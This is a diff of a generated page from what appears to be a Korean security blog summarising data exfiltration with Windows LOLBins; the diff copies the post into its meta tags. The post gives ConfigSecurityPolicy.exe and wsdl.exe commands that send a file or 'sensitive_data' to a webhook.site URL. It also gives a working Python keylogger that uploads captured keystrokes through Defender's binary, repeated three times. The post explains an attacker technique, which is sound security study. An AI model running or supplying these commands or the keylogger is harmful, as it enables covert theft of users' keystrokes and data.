@@ -13,15 +13,97 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="hack &amp; life">
+  <meta name="description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://debugactiveprocess.medium.com/data-exfiltration-with-lolbins-4d9c6e43dacf&#34;&gt;Data Exfiltration with LOLBins&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;Windows&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;Living off the land (LOL)&amp;#xC740; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;&amp;#xC5D0; &amp;#xBBF8;&amp;#xB9AC; &amp;#xC124;&amp;#xCE58;&amp;#xB41C; &amp;#xC2E0;&amp;#xB8B0;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xC545;&amp;#xC131;&amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC804;&amp;#xD30C;&amp;#xD558;&amp;#xB294; &amp;#xAE30;&amp;#xBC95;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. LOL&amp;#xC5D0;&amp;#xB294; Windows &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xC545;&amp;#xC131; &amp;#xD589;&amp;#xC704;&amp;#xB97C; &amp;#xC228;&amp;#xAE30;&amp;#xB294; LOLBins, &amp;#xB77C;&amp;#xC774;&amp;#xBE0C;&amp;#xB7EC;&amp;#xB9AC;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; LOLLibs, &amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; LOLScripts &amp;#xB4F1;&amp;#xC758; &amp;#xB2E4;&amp;#xC591;&amp;#xD55C; &amp;#xAE30;&amp;#xC220;&amp;#xC774; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. LOL&amp;#xC5D0; &amp;#xAD00;&amp;#xD55C; &amp;#xB9CE;&amp;#xC740; &amp;#xD2B8;&amp;#xB9AD;&amp;#xB4E4;&amp;#xC740; &lt;a href=&#34;https://lolbas-project.github.io/&#34;&gt;LOLBAS &amp;#xD504;&amp;#xB85C;&amp;#xC81D;&amp;#xD2B8;&lt;/a&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xC2E4; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;Microsoft Windows Defender&amp;#xC758; &lt;code&gt;ConfigSecurityPolicy.exe&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC720;&amp;#xCD9C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xBC29;&amp;#xBC95;&amp;#xC774; &amp;#xBC1C;&amp;#xACAC;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs subunit&#34;&gt;ConfigSecurityPolicy.exe C:\temp\config.xml &amp;quot;https://webhook.site/4bce19be&lt;span class=&#34;hljs-string&#34;&gt;-2642&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;-4&lt;/span&gt;f76&lt;span class=&#34;hljs-string&#34;&gt;-9&lt;/span&gt;e8e&lt;span class=&#34;hljs-string&#34;&gt;-7&lt;/span&gt;aea1448322d?sensitive_data&amp;quot;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC704;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;webhook.site&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;C:\temp\config.xml&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xC774; &lt;code&gt;sensitive_data&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xB85C; &amp;#xC5C5;&amp;#xB85C;&amp;#xB4DC;&amp;#xB41C; &amp;#xD6C4; &amp;#xD574;&amp;#xB2F9; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xB610;&amp;#xD55C; .NET Framework development environment&amp;#xC5D0;&amp;#xC11C; &amp;#xC6F9; &amp;#xC11C;&amp;#xBC84; &amp;#xD504;&amp;#xB85D;&amp;#xC2DC;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; Microsoft Web Services Description Language Utility&amp;#xC778; &lt;code&gt;wsdl.exe&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8; &amp;#xD504;&amp;#xB85D;&amp;#xC2DC;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD558;&amp;#xC5EC; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC720;&amp;#xCD9C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;wsdl&lt;/span&gt;.exe /server ttps://webhook.site/&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;bce&lt;span class=&#34;hljs-number&#34;&gt;19&lt;/span&gt;be-&lt;span class=&#34;hljs-number&#34;&gt;2642&lt;/span&gt;-&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;f&lt;span class=&#34;hljs-number&#34;&gt;76&lt;/span&gt;-&lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;e-&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;aea&lt;span class=&#34;hljs-number&#34;&gt;1448322&lt;/span&gt;d?sensitive_data&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xD574;&amp;#xB2F9; LOLBins&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; Windows defender&amp;#xC758; &amp;#xB85C;&amp;#xADF8;&amp;#xB97C; &amp;#xCD94;&amp;#xCD9C;&amp;#xD558;&amp;#xC5EC; &amp;#xD0A4;&amp;#xB85C;&amp;#xAE45;&amp;#xB3C4; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# From: https://github.com/moses-palmer/pynput&lt;/span&gt;
+from pynput.keyboard import Key, Listener
+import os
+import sys
+import subprocess
+URL = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;https://webhook.site/xxxxxx-xxxxx-xxxx-xxxxx-xxxxxxx&amp;apos;&lt;/span&gt;
+uploader = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\ConfigSecurityPolicy.exe&amp;quot;&lt;/span&gt;
+content = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+def on_press(key):
+    global content
+    global URL
+    global uploader
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; str(key) == &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Key.backspace&amp;apos;&lt;/span&gt;:
+        content += &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos; &amp;apos;&lt;/span&gt;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:
+        content += str(key)
+print(f&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;last key: {str(key)}&amp;apos;&lt;/span&gt;)
+    print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;)
+&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; str(key) == &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Key.enter&amp;apos;&lt;/span&gt;:
+        upload_url = (f&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;{URL}?{content}&amp;apos;&lt;/span&gt;)
+        subprocess.call([uploader, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;c:\\temp\\test.xml&amp;apos;&lt;/span&gt;, upload_url])
+        buffer = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;apos;&lt;/span&gt;
+&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; key == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x03:
+        sys.&lt;span class=&#34;hljs-keyword&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)
+&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:
+    try:
+        with Listener(on_press=on_press) as listener:
+            listener.join()
+    except (KeyboardInterrupt, SystemExit):
+        sys.&lt;span class=&#34;hljs-keyword&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
+ - hack &amp; life">
   <meta name="author" content="j0dev, y2sman">
   <meta name="keywords" content>
   <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
 
   <meta property="og:type" content="website"> 
   <meta property="og:title" content="[하루한줄] Data Exfiltration with LOLBins - hackyboiz">
-  <meta property="og:description" content="hack &amp; life">
-  <meta property="og:image" content="/img/favicon.ico">
+  <meta property="og:description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://debugactiveprocess.medium.com/data-exfiltration-with-lolbins-4d9c6e43dacf&#34;&gt;Data Exfiltration with LOLBins&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;Windows&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;Living off the land (LOL)&amp;#xC740; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;&amp;#xC5D0; &amp;#xBBF8;&amp;#xB9AC; &amp;#xC124;&amp;#xCE58;&amp;#xB41C; &amp;#xC2E0;&amp;#xB8B0;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xC545;&amp;#xC131;&amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC804;&amp;#xD30C;&amp;#xD558;&amp;#xB294; &amp;#xAE30;&amp;#xBC95;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. LOL&amp;#xC5D0;&amp;#xB294; Windows &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xC545;&amp;#xC131; &amp;#xD589;&amp;#xC704;&amp;#xB97C; &amp;#xC228;&amp;#xAE30;&amp;#xB294; LOLBins, &amp;#xB77C;&amp;#xC774;&amp;#xBE0C;&amp;#xB7EC;&amp;#xB9AC;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; LOLLibs, &amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; LOLScripts &amp;#xB4F1;&amp;#xC758; &amp;#xB2E4;&amp;#xC591;&amp;#xD55C; &amp;#xAE30;&amp;#xC220;&amp;#xC774; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. LOL&amp;#xC5D0; &amp;#xAD00;&amp;#xD55C; &amp;#xB9CE;&amp;#xC740; &amp;#xD2B8;&amp;#xB9AD;&amp;#xB4E4;&amp;#xC740; &lt;a href=&#34;https://lolbas-project.github.io/&#34;&gt;LOLBAS &amp;#xD504;&amp;#xB85C;&amp;#xC81D;&amp;#xD2B8;&lt;/a&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xC2E4; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;Microsoft Windows Defender&amp;#xC758; &lt;code&gt;ConfigSecurityPolicy.exe&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC720;&amp;#xCD9C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xBC29;&amp;#xBC95;&amp;#xC774; &amp;#xBC1C;&amp;#xACAC;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs subunit&#34;&gt;ConfigSecurityPolicy.exe C:\temp\config.xml &amp;quot;https://webhook.site/4bce19be&lt;span class=&#34;hljs-string&#34;&gt;-2642&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;-4&lt;/span&gt;f76&lt;span class=&#34;hljs-string&#34;&gt;-9&lt;/span&gt;e8e&lt;span class=&#34;hljs-string&#34;&gt;-7&lt;/span&gt;aea1448322d?sensitive_data&amp;quot;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC704;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;webhook.site&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;C:\temp\config.xml&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xC774; &lt;code&gt;sensitive_data&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xB85C; &amp;#xC5C5;&amp;#xB85C;&amp;#xB4DC;&amp;#xB41C; &amp;#xD6C4; &amp;#xD574;&amp;#xB2F9; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xB610;&amp;#xD55C; .NET Framework development environment&amp;#xC5D0;&amp;#xC11C; &amp;#xC6F9; &amp;#xC11C;&amp;#xBC84; &amp;#xD504;&amp;#xB85D;&amp;#xC2DC;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; Microsoft Web Services Description Language Utility&amp;#xC778; &lt;code&gt;wsdl.exe&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8; &amp;#xD504;&amp;#xB85D;&amp;#xC2DC;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD558;&amp;#xC5EC; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC720;&amp;#xCD9C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;wsdl&lt;/span&gt;.exe /server ttps://webhook.site/&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;bce&lt;span class=&#34;hljs-number&#34;&gt;19&lt;/span&gt;be-&lt;span class=&#34;hljs-number&#34;&gt;2642&lt;/span&gt;-&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;f&lt;span class=&#34;hljs-number&#34;&gt;76&lt;/span&gt;-&lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;e-&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;aea&lt;span class=&#34;hljs-number&#34;&gt;1448322&lt;/span&gt;d?sensitive_data&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xD574;&amp;#xB2F9; LOLBins&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; Windows defender&amp;#xC758; &amp;#xB85C;&amp;#xADF8;&amp;#xB97C; &amp;#xCD94;&amp;#xCD9C;&amp;#xD558;&amp;#xC5EC; &amp;#xD0A4;&amp;#xB85C;&amp;#xAE45;&amp;#xB3C4; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# From: https://github.com/moses-palmer/pynput&lt;/span&gt;
+from pynput.keyboard import Key, Listener
+import os
+import sys
+import subprocess
+URL = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;https://webhook.site/xxxxxx-xxxxx-xxxx-xxxxx-xxxxxxx&amp;apos;&lt;/span&gt;
+uploader = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\ConfigSecurityPolicy.exe&amp;quot;&lt;/span&gt;
+content = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+def on_press(key):
+    global content
+    global URL
+    global uploader
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; str(key) == &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Key.backspace&amp;apos;&lt;/span&gt;:
+        content += &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos; &amp;apos;&lt;/span&gt;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:
+        content += str(key)
+print(f&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;last key: {str(key)}&amp;apos;&lt;/span&gt;)
+    print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;)
+&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; str(key) == &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Key.enter&amp;apos;&lt;/span&gt;:
+        upload_url = (f&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;{URL}?{content}&amp;apos;&lt;/span&gt;)
+        subprocess.call([uploader, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;c:\\temp\\test.xml&amp;apos;&lt;/span&gt;, upload_url])
+        buffer = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;apos;&lt;/span&gt;
+&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; key == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x03:
+        sys.&lt;span class=&#34;hljs-keyword&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)
+&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:
+    try:
+        with Listener(on_press=on_press) as listener:
+            listener.join()
+    except (KeyboardInterrupt, SystemExit):
+        sys.&lt;span class=&#34;hljs-keyword&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/img/1day1line.png">
   <meta property="og:url" content="https://hackyboiz.github.io/">
 
   <link rel="canonical" href="https://hackyboiz.github.io/2021/07/22/idioth/2021-07-22/">
@@ -247,11 +329,9 @@
 <h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Living off the land (LOL)&#xC740; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xBBF8;&#xB9AC; &#xC124;&#xCE58;&#xB41C; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC788;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; &#xC804;&#xD30C;&#xD558;&#xB294; &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;. LOL&#xC5D0;&#xB294; Windows &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC545;&#xC131; &#xD589;&#xC704;&#xB97C; &#xC228;&#xAE30;&#xB294; LOLBins, &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; LOLLibs, &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; LOLScripts &#xB4F1;&#xC758; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xC220;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. LOL&#xC5D0; &#xAD00;&#xD55C; &#xB9CE;&#xC740; &#xD2B8;&#xB9AD;&#xB4E4;&#xC740; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://lolbas-project.github.io/">LOLBAS &#xD504;&#xB85C;&#xC81D;&#xD2B8;</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD558;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p>Microsoft Windows Defender&#xC758; <code>ConfigSecurityPolicy.exe</code>&#xB97C; &#xD1B5;&#xD574; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs subunit">ConfigSecurityPolicy.exe C:\temp\config.xml &quot;https://webhook.site/4bce19be<span class="hljs-string">-2642</span><span class="hljs-string">-4</span>f76<span class="hljs-string">-9</span>e8e<span class="hljs-string">-7</span>aea1448322d?sensitive_data&quot;</code></pre>
-
 <p>&#xC704;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; <code>webhook.site</code>&#xC5D0; <code>C:\temp\config.xml</code> &#xD30C;&#xC77C;&#xC774; <code>sensitive_data</code> &#xD30C;&#xC77C;&#xB85C; &#xC5C5;&#xB85C;&#xB4DC;&#xB41C; &#xD6C4; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p>&#xB610;&#xD55C; .NET Framework development environment&#xC5D0;&#xC11C; &#xC6F9; &#xC11C;&#xBC84; &#xD504;&#xB85D;&#xC2DC;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB294; Microsoft Web Services Description Language Utility&#xC778; <code>wsdl.exe</code>&#xB97C; &#xD1B5;&#xD574; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xD504;&#xB85D;&#xC2DC;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xC5EC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs apache"><span class="hljs-attribute">wsdl</span>.exe /server ttps://webhook.site/<span class="hljs-number">4</span>bce<span class="hljs-number">19</span>be-<span class="hljs-number">2642</span>-<span class="hljs-number">4</span>f<span class="hljs-number">76</span>-<span class="hljs-number">9</span>e<span class="hljs-number">8</span>e-<span class="hljs-number">7</span>aea<span class="hljs-number">1448322</span>d?sensitive_data</code></pre>
-
 <p>&#xD574;&#xB2F9; LOLBins&#xB97C; &#xD1B5;&#xD574; Windows defender&#xC758; &#xB85C;&#xADF8;&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xC5EC; &#xD0A4;&#xB85C;&#xAE45;&#xB3C4; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs awk"><span class="hljs-comment"># From: https://github.com/moses-palmer/pynput</span>
 from pynput.keyboard import Key, Listener
@@ -283,7 +363,6 @@ print(f<span class="hljs-string">&apos;last key: {str(key)}&apos;</span>)
             listener.join()
     except (KeyboardInterrupt, SystemExit):
         sys.<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)</code></pre>
-
 
             </div>
             <hr>
